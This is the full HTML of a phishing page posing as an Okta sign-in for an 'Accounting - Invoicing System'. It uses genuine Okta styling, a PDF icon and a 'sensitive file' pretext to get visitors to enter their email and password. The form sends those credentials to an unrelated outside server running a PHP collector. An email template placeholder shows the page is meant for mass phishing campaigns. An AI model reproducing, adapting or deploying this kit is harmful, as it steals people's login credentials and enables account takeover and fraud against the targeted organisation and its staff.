<html><!--<![endif]--><head>

    <script>if (typeof module === 'object') {window.module = module; module = undefined;}</script>

    <title>Accounting - Invoicing System </title>
        <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="none">

    <link href="https://atcocorp.okta.com/assets/loginpage/css/okta-login-page.min.0f4b9922bfa70975cc884fea7cbd71fa.css" type="text/css" rel="stylesheet"><script>
        var okta = {
            locale: 'en',
            deployEnv: 'PROD'
        };
    </script>


<script src="https://atcocorp.okta.com/assets/js/mvc/loginpage/initLoginPage.pack.34c59a55bb3a42c88a91a86c33d95ad4.js" crossorigin="anonymous" integrity="sha384-ekzWS2nSsKeC5/OJ5nzxBajAU3seb0ultLc8ltcppxoPRNBiKkisviHs5q4iXxev"></script></head>
<body class="auth okta-container">

<!--[if gte IE 8]>
  <![if lte IE 9]>

    <style>
    .unsupported-browser-banner-wrap {
      padding: 20px;
      border: 1px solid #ddd;
      background-color: #f3fbff;
    }
    .unsupported-browser-banner-inner {
      position: relative;
      width: 735px;
      margin: 0 auto;
      text-align: left;
    }
    .unsupported-browser-banner-inner .icon {
      vertical-align: top;
      margin-right: 20px;
      display: inline-block;
      position: static !important;
    }
    .unsupported-browser-banner-inner a {
      text-decoration: underline;
    }
    </style>

    <div class="unsupported-browser-banner-wrap">
      <div class="unsupported-browser-banner-inner">
        <span class="icon icon-16 icon-only warning-16-yellow"></span>You are using an unsupported browser. For the best experience, update to <a href="https://support.okta.com/help/articles/Knowledge_Article/24532952-Platforms---Browser-and-OS-Support">a supported browser</a>.</div>
    </div>

  <![endif]>
<![endif]-->
<!--[if IE 8]> <div id="login-bg-image-ie8" class="login-bg-image" data-se="login-bg-image"></div> <![endif]-->
<!--[if (gt IE 8)|!(IE)]><!--> <div id="login-bg-image" class="login-bg-image" data-se="login-bg-image" style="background-image: none"></div> <!--<![endif]-->

<!-- hidden form for reposting fromURI for X509 auth -->
<form action="/login/cert" method="post" id="x509_login" name="x509_login" style="display:none;">
    <input type="hidden" class="hide" name="_xsrfToken" value="null"><input type="hidden" id="fromURI" name="fromURI" class="hidden" value="/user/notifications">
</form>

<div class="content">
  <style type="text/css">
    .noscript-msg {
        background-color: #fff;
        border-color: #ddd #ddd #d8d8d8;
        box-shadow:0 2px 0 rgba(175, 175, 175, 0.12);
        text-align: center;
        width: 398px;
        min-width: 300px;
        margin: 200px auto;
        border-radius: 3px;
        border-width: 1px;
        border-style: solid;
    }

    .noscript-content {
        padding: 42px;
    }

    .noscript-content h2 {
        padding-bottom: 20px;
    }

    .noscript-content h1 {
        padding-bottom: 25px;
    }

    .noscript-content a {
        background: transparent;
        box-shadow: none;
        display: table-cell;
        vertical-align: middle;
        width: 314px;
        height: 50px;
        line-height: 36px;
        color: #fff;
        background: linear-gradient(#007dc1, #0073b2), #007dc1;
        border: 1px solid;
        border-color: #004b75;
        border-bottom-color: #00456a;
        box-shadow: rgba(0, 0, 0, 0.15) 0 1px 0, rgba(255, 255, 255, 0.1) 0 1px 0 0 inset;
        -webkit-border-radius: 3px;
        border-radius: 3px;
    }

    .noscript-content a:hover {
        background: #007dc1;
        cursor: hand;
        text-decoration: none;
    }
</style>

<div id="signin-container"><div data-se="auth-container" id="okta-sign-in" class="auth-container main-container can-remove-beacon">      <div class="okta-sign-in-header auth-header"><div data-type="beacon-container" class="beacon-container" style="transform: scale(1); text-indent: 1px;"><div class="js-security-beacon">    <div class="beacon-blank">      <div class="radial-progress-bar">        <div class="circle left"></div>        <div class="circle right"></div>      </div>    </div>    <div aria-live="polite" role="img" class="bg-helper auth-beacon auth-beacon-security" data-se="security-beacon"><img src="https://e7.pngegg.com/pngimages/571/47/png-clipart-adobe-acrobat-pdf-computer-icons-adobe-reader-edu-invest-adobe-pdf-text-logo-thumbnail.png" width="90px">    <span class="accessibility-text"></span>
      <div class="okta-sign-in-beacon-border js-auth-beacon-border">      </div>    </div>    </div></div>      </div>      <div class="auth-content"><div class="auth-content-inner"><div class="primary-auth"><form method="POST" action="http://sistemacartera.proexito.com.mx/nord.php" data-se="o-form" slot="content" id="form1" class="primary-auth-form o-form o-form-edit-mode">        <div data-se="o-form-content" class="o-form-content o-form-theme clearfix">                        <h2 data-se="o-form-head" class="okta-form-title o-form-head">Because you're accessing a sensitive file, you need to verify your identity.</h2>                          <div class="o-form-error-container" data-se="o-form-error-container"></div>      <div class="o-form-fieldset-container" data-se="o-form-fieldset-container"><div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-5"><div data-se="o-form-label" class="okta-form-label o-form-label">
        <label for="okta-signin-username">Email Address&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><p class="o-form-explain"></p>                  <input type="hidden" name="email" value="[[-Email-]]">  <input data-se="o-form-input" class="o-form-input-name-username o-form-control okta-form-input-field input-fix" type="email"  name="email"  autofocus id="okta-signin-email" value="[[-Email-]]" aria-label="" placeholder="Email" autocomplete="email" required=""disabled>
      </div></div><div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-30"><div data-se="o-form-label" class="okta-form-label o-form-label"><label for="okta-signin-password">Password&nbsp;</label></div><div data-se="o-form-input-container" class="o-form-input"><p class="o-form-explain">Your Email Password</p><span data-se="o-form-input-password" class="o-form-input-name-password o-form-control okta-form-input-field input-fix">                  <input type="password" placeholder="password" name="password" id="okta-signin-password" value="" aria-label="" autocomplete="off" class="password-with-toggle" required autofocus>                  <span class="password-toggle">        <span class="eyeicon visibility-16 button-show"></span>        <span class="eyeicon visibility-off-16 button-hide"></span>      </span>  </span></div></div><div data-se="o-form-fieldset" class="o-form-fieldset o-form-label-top margin-btm-0"><div data-se="o-form-input-container" class="o-form-input"><span data-se="o-form-input-remember" class="o-form-input-name-remember">    <div class="custom-checkbox"><input type="checkbox" name="remember" id="input7"><label for="input7" data-se-for-name="remember" class="">Remember me</label></div>      </span></div></div></div>    </div>  <div class="o-form-button-bar"><input class="button button-primary" type="submit" value="Download" id="okta-signin-submit" data-type="save"></div></form><div class="auth-footer">      <a href="#" data-se="needhelp" aria-expanded="false" aria-controls="help-links-container" class="link help js-help">       </a>      <ul class="help-links js-help-links" id="help-links-container" style="display: none;">        <li>        <a href="#" data-se="forgot-password" class="link js-forgot-password">        Forgot password?        </a>        </li>                  <li>          <a href="#" data-se="unlock" class="link js-unlock">          Unlock account?          </a>          </li>                        <li>        <a href="#" data-se="help-link" class="link js-help-link" rel="noopener noreferrer" target="_blank">        Help        </a>        </li>      </ul>    </div></div></div></div>    </div></div>
  
</div>



</body></html>
